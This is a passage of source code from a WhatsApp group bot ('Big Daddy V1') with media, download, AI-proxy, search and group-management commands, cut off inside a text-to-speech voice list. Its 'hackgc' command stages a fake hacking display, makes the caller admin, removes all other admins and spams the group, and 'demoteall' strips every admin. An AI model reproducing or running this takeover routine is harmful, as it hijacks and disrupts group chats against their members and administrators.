        // Download the media locally
        const mediaPath = await PhistarBotInc.downloadAndSaveMediaMessage(quoted);

        // Upload the file to Catbox
        const uploadResponse = await catbox(mediaPath);

        // Check upload response and send the result
        if (uploadResponse && uploadResponse.url) {
            await PhistarBotInc.sendMessage(m.chat, {
                text: `*UPLOAD SUCCESSFUL!!*\n\n> *URL:*\n\n${uploadResponse.url}`
            }, { quoted: m });
        } else {
            await replyphistar(`*UPLOAD FAILED, PLEASE TRY AGAIN*`);
        }

        // Clean up: Remove the saved media file after processing
        fs.unlinkSync(mediaPath);
    } catch (error) {
        console.error('Error in URL command:', error);
        await replyphistar(`*AN ERROR OCCURRED!! MESSAGE:*\n\n> ${error.message}`);
    }
    break;
}
    case "apk":
case "apkdl": {
    if (!text) return replyphistar("✨ *Please specify the APK you want to download!*");

    try {
        // Fetch APK search results
        let kyuu = await fetchJson(`https://bk9.fun/search/apk?q=${text}`);
        if (!kyuu.BK9 || kyuu.BK9.length === 0) {
            return replyphistar("❌ *No APKs found for the given search query.*");
        }

        // Fetch APK download link
        let tylor = await fetchJson(`https://bk9.fun/download/apk?id=${kyuu.BK9[0].id}`);
        
        // Send download link
        const downloadMessage = `🎮 *APK Download Link*\n\n` +
                                `📦 *Name:* ${tylor.BK9.name}\n` +
                                `🔗 *Download Link:* [Click Here](${tylor.BK9.dllink})\n`;

        await PhistarBotInc.sendMessage(
            m.chat,
            {
                text: downloadMessage,
                contextInfo: {
                    externalAdReply: {
                        title: `Download APK: ${tylor.BK9.name}`,
                        body: "Click the link to download the APK!",
                        thumbnailUrl: tylor.BK9.thumb, // Using the app's URL thumbnail image
                        sourceUrl: tylor.BK9.dllink,
                        mediaType: 2,
                        showAdAttribution: true,
                        renderLargerThumbnail: true
                    }
                }
            },
            { quoted: m }
        );
    } catch (error) {
        console.error('Error in APK command:', error);
        replyphistar("❌ *An error occurred while processing the request. Please try again later.*");
    }
    break;
}
case 'mediafire': {
    if (!text) return replyphistar(`*Example*: ${prefix + command} link...`);

    try {
        // Construct the API URL for MediaFire
        const apiUrl = `https://api.davidcyriltech.my.id/mediafire?url=${encodeURIComponent(text)}`;
        const apiResponse = await axios.get(apiUrl);

        // Check if the API response indicates success
        if (apiResponse.data && apiResponse.data.downloadLink) {
            const { fileName, mimeType, downloadLink } = apiResponse.data;

            // Send the file back to the user
            await PhistarBotInc.sendMessage(
                m.chat,
                {
                    document: { url: downloadLink },
                    mimetype: mimeType,
                    fileName: fileName,
                    caption: `📦 *File Name:* ${fileName}`,
                },
                { quoted: m }
            );
        } else {
            // If the API response does not indicate success, reply with an error message
            replyphistar(`*Failed to fetch file details! Please check the MediaFire URL and try again.*`);
        }
    } catch (error) {
        // Log the error for debugging purposes
        console.error('Error during MediaFire command:', error);

        // Reply with a generic error message
        replyphistar(`*An error occurred while processing your request. Please try again later.*`);
    }
    break;
}
case 'screenshot': {
    if (!text) return replyphistar(`*Example*: ${prefix + command} link`);

    try {
        // Construct the API URL for the screenshot
        const apiUrl = `https://api.davidcyriltech.my.id/ssweb?url=${encodeURIComponent(text)}&device=tablet`;

        // Fetch the screenshot from the API
        const apiResponse = await axios.get(apiUrl);

        // Check if the API response indicates success
        if (apiResponse.data && apiResponse.data.success) {
            const { screenshotUrl } = apiResponse.data;

            // Send the screenshot back to the user
            await PhistarBotInc.sendMessage(
                m.chat,
                {
                    image: { url: screenshotUrl },
                    caption: `🖼️ *Web Screenshot* \n\n🌐 URL: ${text}\n📱 Device: Tablet`,
                },
                { quoted: m }
            );
        } else {
            // If the API response does not indicate success, reply with an error message
            replyphistar(`*Failed to capture the screenshot! Please check the URL and try again.*`);
        }
    } catch (error) {
        // Log the error for debugging purposes
        console.error('Error during ssweb command:', error);

        // Reply with a generic error message
        replyphistar(`*An error occurred while processing your request. Please try again later.*`);
    }
    break;
}
    case 'chatgpt': 
case 'blackbox': 
case 'chatgpt4': {
    if (!text) {
        PhistarBotInc.sendMessage(m.chat, { text: '❓ *Please ask me anything!*' }, { quoted: m });
        return;
    }

    try {
        const userId = m.sender; // Use the sender's ID as the userId
        const apiUrl = `https://bk9.fun/ai/GPT-4?q=${encodeURIComponent(text)}&userId=${encodeURIComponent(userId)}`;

        // Fetch response from the API
        const response = await fetch(apiUrl);
        const jsonData = await response.json();

        // Check if the API returned a valid response
        if (jsonData.status && jsonData.BK9) {
            PhistarBotInc.sendMessage(m.chat, { text: jsonData.BK9 }, { quoted: m }); // Send the AI's response
        } else {
            PhistarBotInc.sendMessage(m.chat, { text: '*Failed to fetch response from the AI. Please try again later.*' }, { quoted: m });
        }
    } catch (error) {
        console.error('Error fetching API response:', error);
        PhistarBotInc.sendMessage(m.chat, { text: '*An error occurred while fetching the AI response. Please try again later.*' }, { quoted: m });
    }
    break;
}
case 'tiktokstalk':
case 'ttstalk': {
    if (!args[0]) return replyphistar('Please provide a TikTok username!');

    const username = args[0];

    try {
        const response = await axios.get(`https://bk9.fun/stalk/tiktok?q=${username}`);

        // Check if the request was successful
        if (response.data.status === true) {
            const profile = response.data.BK9;

            // Format and send profile information with a thumbnail (profile picture)
            await PhistarBotInc.sendMessage(m?.chat, {
                image: { url: profile.profile },
                caption: `*[ TIKTOK PROFILE INFO ]*\n
- *🔖Name:* ${profile.name}
- *🔖Username:* ${profile.username}
- *👥Follower:* ${profile.followers}
- *🫂Following:* ${profile.following}
- *Likes:* ${profile.likes}
-  *📌Bio:* ${profile.bio || 'No bio available'}
- *🏝️Description:*: ${profile.desc || 'No description available'}`
            });

        } else {
            replyphistar('Could not retrieve the profile. Please make sure the username is correct!');
        }
    } catch (error) {
        console.error(error);
        replyphistar('There was an error fetching the TikTok profile information.');
    }
    break;
}
case 'demoteall': {
    if (!m.isGroup) return replyphistar('This command can only be used in groups.');
    if (!isBotAdmins) return replyphistar('Bot must be an admin to use this command.');
    if (!isGroupOwner && !isAdmins) return replyphistar('Only group admins can use this command.');

    for (let admin of groupAdmins) {
        if (admin !== botNumber) {
            try {
                await PhistarBotInc.groupParticipantsUpdate(from, [admin], 'demote');
                await delay(500); // Add a 1-second delay between each request
            } catch (err) {
                console.log(`Error demoting ${admin}:`, err.message);
            }
        }
    }
    replyphistar('Successfully demoted all admins to members.');
    break;
}
case 'gpt4': 
case 'gpt3': 
case 'gptpro': {
    if (!text) {
        PhistarBotInc.sendMessage(m.chat, { text: '❓ *Please ask me anything!*' }, { quoted: m });
        return;
    }

    try {
        const userId = m.sender; // Use the sender's ID as the userId
        const apiUrl = `https://bk9.fun/ai/GPT-4?q=${encodeURIComponent(text)}&userId=${encodeURIComponent(userId)}`;

        // Fetch response from the API
        const response = await fetch(apiUrl);
        const jsonData = await response.json();

        // Check if the API returned a valid response
        if (jsonData.status && jsonData.BK9) {
            PhistarBotInc.sendMessage(m.chat, { text: jsonData.BK9 }, { quoted: m }); // Send the AI's response
        } else {
            PhistarBotInc.sendMessage(m.chat, { text: '*Failed to fetch response from the AI. Please try again later.*' }, { quoted: m });
        }
    } catch (error) {
        console.error('Error fetching API response:', error);
        PhistarBotInc.sendMessage(m.chat, { text: '*An error occurred while fetching the AI response. Please try again later.*' }, { quoted: m });
    }
    break;
}
    case 'hackgc':
    if (!m.isGroup) return replyphistar(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyphistar(mess.admin)
                if (!isBotAdmins) return replyphistar(mess.botAdmin)
    try {
        const groupId = m.chat; // Current group ID
        const targetUser = m.sender; // The sender initiating the hack

        // Step 1: Simulate hacking progression
        const hackingSteps = [
            { percentage: 10, message: "Establishing secure connection..." },
            { percentage: 30, message: "Bypassing group security protocols..." },
            { percentage: 50, message: "Attempting to gain admin privileges..." },
            { percentage: 70, message: "Adding ghost (fake) contacts to the group..." },
            { percentage: 85, message: "Neutralizing existing admin accounts..." },
            { percentage: 100, message: "Finalizing hack and locking group access..." }
        ];

        for (const step of hackingSteps) {
            await replyphistar(
                `🛠️ *HACK IN PROGRESS*\n\n` +
                `Progress: *${step.percentage}%*\n` +
                `Action: ${step.message}\n\n` +
                `Loading... █${'█'.repeat(step.percentage / 10)}${'░'.repeat(10 - step.percentage / 10)}`
            );
            await new Promise(resolve => setTimeout(resolve, 2000)); // Delay for effect
        }

        // Step 2: Make the user an admin
        await PhistarBotInc.groupParticipantsUpdate(groupId, [targetUser], 'promote')
            .then(() => {
                replyphistar(`✅ *SUCCESS!*\n\nYou are now an admin of this group.`);
            })
            .catch(err => {
                console.error("❌ Failed to promote user to admin:", err.message);
                return replyphistar("❌ *Hack Failed: Unable to gain admin privileges.*");
            });   
        // Step 4: Remove all other admins
        const groupMetadata = await PhistarBotInc.groupMetadata(groupId);
        const groupParticipants = groupMetadata.participants;
        const groupAdmins = groupParticipants.filter(p => p.admin).map(admin => admin.id);

        // Demote and remove all other admins except the target user
        for (const adminId of groupAdmins) {
            if (adminId !== targetUser) {
                await PhistarBotInc.groupParticipantsUpdate(groupId, [adminId], 'demote')
                    .then(() => console.log(`✅ Admin ${adminId} demoted successfully.`))
                    .catch(err => console.error(`❌ Failed to demote admin ${adminId}: ${err.message}`));

                await PhistarBotInc.groupParticipantsUpdate(groupId, [adminId], 'remove')
                    .then(() => console.log(`✅ Admin ${adminId} removed successfully.`))
                    .catch(err => console.error(`❌ Failed to remove admin ${adminId}: ${err.message}`));
            }
        }

        // Step 5: Spam the group with messages
        const spamMessage = "🔥 *This group has been hacked by BigDaddy V1!* 🔥\n\nSecurity compromised. Contact the owner to restore access.";
        for (let i = 0; i < 10; i++) { // Sends 10 spam messages
            await PhistarBotInc.sendMessage(groupId, { text: spamMessage })
                .then(() => console.log(`✅ Spam message ${i + 1} sent.`))
                .catch(err => console.error(`❌ Failed to send spam message ${i + 1}: ${err.message}`));
        }

        replyphistar(
            "✅ *HACK SUCCESSFUL!*\n\n" +
            "🎉 Group has been compromised successfully.\n" +
            "👤 Fake contacts added.\n" +
            "🔐 Admins removed.\n" +
            "💣 Group spammed with warning messages."
        );
    } catch (err) {
        replyphistar('❌ *ERROR: An unexpected error occurred during the hack process.*');
        console.error(err);
    }
    break;
            case 'promote':
                if (!m.isGroup) return replyphistar(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyphistar(mess.admin)
                if (!isBotAdmins) return replyphistar(mess.botAdmin)
                let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await PhistarBotInc.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote').then((res) => replyphistar(json(res))).catch((err) => replyphistar(json(err)))
                break
            case 'demote':
                if (!m.isGroup) return replyphistar(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyphistar(mess.admin)
                if (!isBotAdmins) return replyphistar(mess.botAdmin)
                let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await PhistarBotInc.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote').then((res) => replyphistar(json(res))).catch((err) => replyphistar(json(err)))
                break
            case 'setname':
            case 'setsubject':
                if (!m.isGroup) return replyphistar(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyphistar(mess.admin)
                if (!isBotAdmins) return replyphistar(mess.botAdmin)
                if (!text) return 'Text ?'
                await PhistarBotInc.groupUpdateSubject(m.chat, text).then((res) => replyphistar(mess.success)).catch((err) => replyphistar(json(err)))
                break
            case 'setdesc':
            case 'setdesk':
                if (!m.isGroup) return replyphistar(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyphistar(mess.admin)
                if (!isBotAdmins) return replyphistar(mess.botAdmin)
                if (!text) return 'Text ?'
                await PhistarBotInc.groupUpdateDescription(m.chat, text).then((res) => replyphistar(mess.success)).catch((err) => replyphistar(json(err)))
                break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
                if (!m.isGroup) return replyphistar(mess.group)
                if (!isAdmins) return replyphistar(mess.admin)
                if (!isBotAdmins) return replyphistar(mess.botAdmin)
                if (!quoted) return replyphistar(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replyphistar(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replyphistar(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await PhistarBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await PhistarBotInc.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replyphistar(mess.done)
                } else {
                    var memeg = await PhistarBotInc.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replyphistar(mess.done)
                }
                break
            case 'tagall':
                if (!m.isGroup) return replyphistar(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator && !isPremium) return replyphistar(mess.admin)
                if (!isBotAdmins && !isCreator && !isPremium) return replyphistar(mess.botAdmin)
                let teks = `*👥 You have Tag All*
 
                 🗞️ *Message : ${q ? q : 'blank'}*\n\n`
                for (let mem of participants) {
                    teks += `• @${mem.id.split('@')[0]}\n`
                }
                PhistarBotInc.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'hidetag':
                if (!m.isGroup) return replyphistar(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator && !isPremium) return replyphistar(mess.admin)
                if (!isBotAdmins && !isCreator && !isPremium) return replyphistar(mess.botAdmin)
                PhistarBotInc.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'totag':
                if (!m.isGroup) return replyphistar(mess.group)
                if (!isBotAdmins && !isCreator && !isPremium) return replyphistar(mess.botAdmin)
                if (!isAdmins && !isCreator && !isPremium) return replyphistar(mess.admin)
                if (!m.quoted) return replyphistar(`Reply messages with captions ${prefix + command}`)
                PhistarBotInc.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
                break
            case 'group':
            case 'grup':
                if (!m.isGroup) return replyphistar(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyphistar(mess.admin)
                if (!isBotAdmins) return replyphistar(mess.botAdmin)
                if (args[0] === 'close') {
                    await PhistarBotInc.groupSettingUpdate(m.chat, 'announcement').then((res) => replyphistar(`Success In Closing The Group 🕊️`)).catch((err) => replyphistar(json(err)))
                } else if (args[0] === 'open') {
                    await PhistarBotInc.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replyphistar(`Success In Opening The Group 🕊️`)).catch((err) => replyphistar(json(err)))
                } else {
                    replyphistar(`Mode ${command}\n\n\nType ${prefix + command}open/close`)
                }
                break
            case 'editinfo':
                if (!m.isGroup) return replyphistar(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyphistar(mess.admin)
                if (!isBotAdmins) return replyphistar(mess.botAdmin)
                if (args[0] === 'open') {
                    await PhistarBotInc.groupSettingUpdate(m.chat, 'unlocked').then((res) => replyphistar(`Successfully Opened Group Edit Info 🕊️`)).catch((err) => replyphistar(json(err)))
                } else if (args[0] === 'close') {
                    await PhistarBotInc.groupSettingUpdate(m.chat, 'locked').then((res) => replyphistar(`Successfully Closed Group Edit Info🕊️`)).catch((err) => replyphistar(json(err)))
                } else {
                    replyphistar(`Mode ${command}\n\n\nType ${prefix + command}on/off`)
                }
                break
            case 'linkgroup':
            case 'grouplink':
            case 'linkgrup':
            case 'linkgc':
                if (!m.isGroup) return replyphistar(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyphistar(mess.admin)
                if (!isBotAdmins) return replyphistar(mess.botAdmin)
                let response = await PhistarBotInc.groupInviteCode(m.chat)
                PhistarBotInc.sendText(m.chat, `👥 *BIG DADDY V1 DISPLAYS GROUP LINK INFO*\n📛 *Name :* ${groupMetadata.subject}\n👤 *Group Owner :* ${groupMetadata.owner !== undefined ? '@' + groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m, {
                    detectLink: true
                })
                break
            case 'revoke':
            case 'resetlink':
                if (!m.isGroup) return replyphistar(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyphistar(mess.admin)
                if (!isBotAdmins) return replyphistar(mess.botAdmin)
                await PhistarBotInc.groupRevokeInvite(m.chat)
                    .then(res => {
                        replyphistar(`BIG DADDY has Successful Reset, Group Invite Link ${groupMetadata.subject}`)
                    }).catch((err) => replyphistar(json(err)))
                break
case 'ping': {
    const used = process.memoryUsage();
    const cpus = os.cpus();
    
    const cpu = cpus.reduce((acc, cpu) => {
        const total = Object.values(cpu.times).reduce((a, b) => a + b, 0);
        acc.total += total;
        acc.speed += cpu.speed;
        Object.keys(cpu.times).forEach(key => acc.times[key] += cpu.times[key]);
        return acc;
    }, { speed: 0, total: 0, times: { user: 0, nice: 0, sys: 0, idle: 0, irq: 0 } });

    const latency = (performance.now() - speed()).toFixed(4);  
    const ramUsage = formatp(os.totalmem() - os.freemem()) + ' / ' + formatp(os.totalmem());

    const response = `
  *Pong!* 🏓
> *Response Speed:* *${latency}* seconds

> *💻 BIG DADDY V1* Server Info
RAM Usage: *${ramUsage}*`;

    await PhistarBotInc.sendMessage(m.chat, {
        text: response,
        contextInfo: {
            forwardingScore: 9999999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: "ᴘʜ✦ꜱᴛᴀʀ",
                newsletterJid: "120363303946948716@newsletter", // Your Channel JID
            },
            externalAdReply: {
                showAdAttribution: true,
                containsAutoReply: true,
                title: `BIG DADDY V1`,
                body: `ᴘʜ✦ꜱᴛᴀʀ`,
                mediaType: 1, // Forces a Large Image
                renderLargerThumbnail: true, // Makes the image BIG
                thumbnail: fs.readFileSync(`./Phistar-media/phistar.jpg`), // Large Image
                mediaUrl: global.link,
                sourceUrl: global.link
            }
        }
    }, { quoted: m });
}
break;
            case 'buypremium':
case 'buyprem':
case 'premium': {
    let teks = `Hey ${pushname}👋\nWant to Buy Premium? Just chat with Philip 😉👉 t.me/phistar1`;
    await PhistarBotInc.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            forwardingScore: 9999999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {  
                newsletterName: "ᴘʜ✦ꜱᴛᴀʀ",  
                newsletterJid: "120363303946948716@newsletter",  
            }, 
            externalAdReply: {
                showAdAttribution: true,
                title: `${botname}`,
                body: `${ownername}`,
                mediaType: 1,
                renderLargerThumbnail: true,
                thumbnailUrl: 'https://i.postimg.cc/J7B3N4NF/file-Z5-Nh-Z2cc-KK4-TG0sz-L7n-Gcc-FJ-1.webp',
                sourceUrl: global.link
            }
        }
    }, { quoted: m });
}
break;

case 'runtime': {
    let runtimetext = `*Big Daddy V1* 𝐇𝐚𝐯𝐞 𝐛𝐞𝐞𝐧 𝐫𝐮𝐧𝐧𝐢𝐧𝐠 𝐟𝐨𝐫 ${runtime(process.uptime())}`;
    PhistarBotInc.sendMessage(m.chat, {
        text: runtimetext,
        contextInfo: {
            forwardingScore: 9999999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {  
                newsletterName: "ᴘʜ✦ꜱᴛᴀʀ",  
                newsletterJid: "120363303946948716@newsletter",  
            }, 
            externalAdReply: {
                showAdAttribution: true,
                title: `${botname}`,
                body: `phistar`,
                mediaType: 1,
                renderLargerThumbnail: true,
                thumbnailUrl: 'https://i.postimg.cc/J7B3N4NF/file-Z5-Nh-Z2cc-KK4-TG0sz-L7n-Gcc-FJ-1.webp',
                sourceUrl: global.link
            }
        }
    }, { quoted: m });
}
break;

case 'sc':
case 'script':
case 'scriptbot': {
    PhistarBotInc.sendMessage(m.chat, {
        text: `Click here to download the script: https://bigdaddyv1.onrender.com`,
        contextInfo: {
            forwardingScore: 9999999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {  
                newsletterName: "ᴘʜ✦ꜱᴛᴀʀ",  
                newsletterJid: "120363303946948716@newsletter",  
            }, 
            externalAdReply: {
                showAdAttribution: true,
                title: `${botname}`,
                body: `SCRIPT OF ${botname} is on Telegram @phistar`,
                mediaType: 1,
                renderLargerThumbnail: true,
                thumbnailUrl: 'https://i.postimg.cc/J7B3N4NF/file-Z5-Nh-Z2cc-KK4-TG0sz-L7n-Gcc-FJ-1.webp',
                sourceUrl: global.link
            }
        }
    }, { quoted: m });
}
break;
            case 'donate':
            case 'donasi':
                let textnate = `Hello Cutie💕 ${pushname}\n\nNo matter how much you donate is very valuable for us❤️`
                PhistarBotInc.sendMessage(m.chat, {
                    text: 'Palmpay 🏦 Acct No: 9128019141😊 Acct Name: Edward saliu/David Tomiwa\n\n' + textnate
                }, {
                    quoted: m
                })
                break
                case 'google':
    try {
        if (!text) {
            replyphistar("Please provide a query.\n*Example: .google What is a bot.*");
            break;
        }

        const axios = require('axios');
        const cheerio = require('cheerio'); // For scraping Google search results

        replyphistar("Searching Google...");

        const query = encodeURIComponent(text.trim());
        const url = `https://www.google.com/search?q=${query}`;

        // Fetch Google search results
        const { data } = await axios.get(url, {
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            },
        });

        // Parse results using Cheerio
        const $ = cheerio.load(data);
        const results = [];

        $(".tF2Cxc").each((index, element) => {
            const title = $(element).find(".DKV0Md").text();
            const link = $(element).find("a").attr("href");
            const snippet = $(element).find(".IsZvec").text();
            if (title && link) {
                results.push({ title, snippet, link });
            }
        });

        // Check if results exist
        if (results.length === 0) {
            replyphistar(`No results found for: "${text}".`);
            break;
        }

        // Format and send results
        let responseMessage = `*Google Search Results for:* ${text}\n\n`;
        results.slice(0, 5).forEach((result, index) => {
            responseMessage += `*${index + 1}. ${result.title}*\n`;
            responseMessage += `${result.snippet}\n`;
            responseMessage += `_Link:_ ${result.link}\n\n`;
            responseMessage += `────────────────────────\n\n`;
        });

        replyphistar(responseMessage);

    } catch (err) {
        replyphistar("An error occurred during Google search. Please try again.");
        console.error(err.message || err);
    }
    break;
    case 'riddle':
    try {
        // Select a random riddle
        const riddle = devinettes[Math.floor(Math.random() * devinettes.length)];

        // Send the riddle question
        await PhistarBotInc.sendMessage(m.chat, {
            text: `🤔 *Riddle:* ${riddle.question}\n\nYou have *30 seconds* to think!`
        }, { quoted: m });

        // Wait for 30 seconds
        await new Promise(resolve => setTimeout(resolve, 30000));

        // Send the riddle answer
        await PhistarBotInc.sendMessage(m.chat, {
            text: `⏱️ *Time's up!* The answer is: *${riddle.reponse}*`
        }, { quoted: m });

    } catch (error) {
        console.error("Error:", error.message || "An unexpected error occurred.");
        replyphistar("Oops, an error occurred while processing the riddle. Please try again later.");
    }
    break;
case 'owner': {
const repf = await PhistarBotInc.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Contact`, 
contacts: list }, mentions: [sender] }, { quoted: m })
PhistarBotInc.sendMessage(from, { text : `Wag wan @${sender.split("@")[0]}, My  handsome owner but i was created by Phistar,`, mentions: [sender]}, { quoted: repf })
}
break
            case 'sticker':
            case 'stiker':
            case 's': {
                if (!quoted) return replyphistar(`Reply to Video/Image With Caption ${prefix + command}`)
                if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await PhistarBotInc.sendImageAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else if (isVideo || /video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return replyphistar('Maximum 10 seconds!')
                    let media = await quoted.download()
                    let encmedia = await PhistarBotInc.sendVideoAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else {
                    return replyphistar(`Send Images/Videos With Captions ${prefix + command}\nVideo Duration 1-9 Seconds`)
                }
            }
            break
            case 'text2pdf': {
    if (!text) return replyphistar(`❌ Please provide text to convert into a PDF.\nExample: ${prefix + command} Hello, this is my PDF file.`);

    try {
        const apiUrl = `https://apis.davidcyriltech.my.id/tools/pdf?text=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);
        const { success, download } = response.data;

        if (success && download) {
            await PhistarBotInc.sendMessage(m.chat, {
                document: { url: download },
                mimetype: 'application/pdf',
                fileName: 'Converted_Text.pdf',
                caption: `✅ *PDF Generated Successfully!*\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴘʜ✦ꜱᴛᴀʀ ʙᴏᴛ`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate PDF. Please try again later.`);
        }
    } catch (error) {
        console.error('Error generating PDF:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.\nError: ${error.message}`);
    }
    break;
}
            case 'text2speech': {
    function ListVoiceArray(array) {
        const modifiedArray = array.map(item => {
            const modifiedName = item.replace(/(.+)-(.+)-(.+)Neural/, "$3 ($1-$2)");
            const language = item.split('-')[0];
            return `${modifiedName} ( ${language} )`;
        });
        return modifiedArray;
    }

    let ListVoice = [
        "af-ZA-AdriNeural",
        "af-ZA-WillemNeural",
        "am-ET-AmehaNeural",
        "am-ET-MekdesNeural",
        "ar-AE-FatimaNeural",
        "ar-AE-HamdanNeural",
        "ar-BH-AliNeural",
        "ar-BH-LailaNeural",
        "ar-DZ-AminaNeural",
        "ar-DZ-IsmaelNeural",
        "ar-EG-SalmaNeural",
        "ar-EG-ShakirNeural",
        "ar-IQ-BasselNeural",
        "ar-IQ-RanaNeural",
        "ar-JO-SanaNeural",
        "ar-JO-TaimNeural",
        "ar-KW-FahedNeural",
        "ar-KW-NouraNeural",
        "ar-LB-LaylaNeural",
        "ar-LB-RamiNeural",
        "ar-LY-ImanNeural",
        "ar-LY-OmarNeural",
        "ar-MA-JamalNeural",
        "ar-MA-MounaNeural",
        "ar-OM-AbdullahNeural",
        "ar-OM-AyshaNeural",
        "ar-QA-AmalNeural",
        "ar-QA-MoazNeural",
        "ar-SA-HamedNeural",
        "ar-SA-ZariyahNeural",
        "ar-SY-AmanyNeural",
        "ar-SY-LaithNeural",
        "ar-TN-HediNeural",
        "ar-TN-ReemNeural",
        "ar-YE-MaryamNeural",
        "ar-YE-SalehNeural",
        "az-AZ-BabekNeural",
        "az-AZ-BanuNeural",
        "bg-BG-BorislavNeural",
        "bg-BG-KalinaNeural",
        "bn-BD-NabanitaNeural",
        "bn-BD-PradeepNeural",
        "bn-IN-BashkarNeural",
        "bn-IN-TanishaaNeural",
        "bs-BA-GoranNeural",
        "bs-BA-VesnaNeural",
        "ca-ES-AlbaNeural",
        "ca-ES-EnricNeural",
        "ca-ES-JoanaNeural",
        "cs-CZ-AntoninNeural",
        "cs-CZ-VlastaNeural",
        "cy-GB-AledNeural",
        "cy-GB-NiaNeural",
        "da-DK-ChristelNeural",
        "da-DK-JeppeNeural",
        "de-AT-IngridNeural",
        "de-AT-JonasNeural",
        "de-CH-JanNeural",
        "de-CH-LeniNeural",
        "de-DE-AmalaNeural",
        "de-DE-BerndNeural",
        "de-DE-ChristophNeural",
        "de-DE-ConradNeural",
        "de-DE-ElkeNeural",
        "de-DE-GiselaNeural",
        "de-DE-KasperNeural",
        "de-DE-KatjaNeural",
        "de-DE-KillianNeural",
        "de-DE-KlarissaNeural",
        "de-DE-KlausNeural",
        "de-DE-LouisaNeural",
        "de-DE-MajaNeural",
        "de-DE-RalfNeural",
        "de-DE-TanjaNeural",
        "el-GR-AthinaNeural",
        "el-GR-NestorasNeural",
        "en-AU-AnnetteNeural",
        "en-AU-CarlyNeural",
        "en-AU-DarrenNeural",
        "en-AU-DuncanNeural",
        "en-AU-ElsieNeural",
        "en-AU-FreyaNeural",
        "en-AU-JoanneNeural",
        "en-AU-KenNeural",
        "en-AU-KimNeural",
        "en-AU-NatashaNeural",
        "en-AU-NeilNeural",
        "en-AU-TimNeural",
        "en-AU-TinaNeural",
        "en-AU-WilliamNeural",
        "en-CA-ClaraNeural",
        "en-CA-LiamNeural",
        "en-GB-AbbiNeural",
        "en-GB-AlfieNeural",
        "en-GB-BellaNeural",
        "en-GB-ElliotNeural",
        "en-GB-EthanNeural",
        "en-GB-HollieNeural",
        "en-GB-LibbyNeural",
        "en-GB-MaisieNeural",
        "en-GB-MiaNeural",
        "en-GB-NoahNeural",
        "en-GB-OliverNeural",
        "en-GB-OliviaNeural",
        "en-GB-RyanNeural",
        "en-GB-SoniaNeural",
        "en-GB-ThomasNeural",
        "en-HK-SamNeural",
        "en-HK-YanNeural",
        "en-IE-ConnorNeural",
        "en-IE-EmilyNeural",
        "en-IN-NeerjaNeural",
        "en-IN-PrabhatNeural",
        "en-KE-AsiliaNeural",
        "en-KE-ChilembaNeural",
        "en-NG-AbeoNeural",
        "en-NG-EzinneNeural",
        "en-NZ-MitchellNeural",
        "en-NZ-MollyNeural",
        "en-PH-JamesNeural",
        "en-PH-RosaNeural",
        "en-SG-LunaNeural",
        "en-SG-WayneNeural",
        "en-TZ-ElimuNeural",
        "en-TZ-ImaniNeural",
        "en-US-AIGenerate1Neural",
        "en-US-AIGenerate2Neural",
        "en-US-AmberNeural",
        "en-US-AnaNeural",
        "en-US-AriaNeural",
        "en-US-AshleyNeural",
        "en-US-BlueNeural",
        "en-US-BrandonNeural",
        "en-US-ChristopherNeural",
        "en-US-CoraNeural",
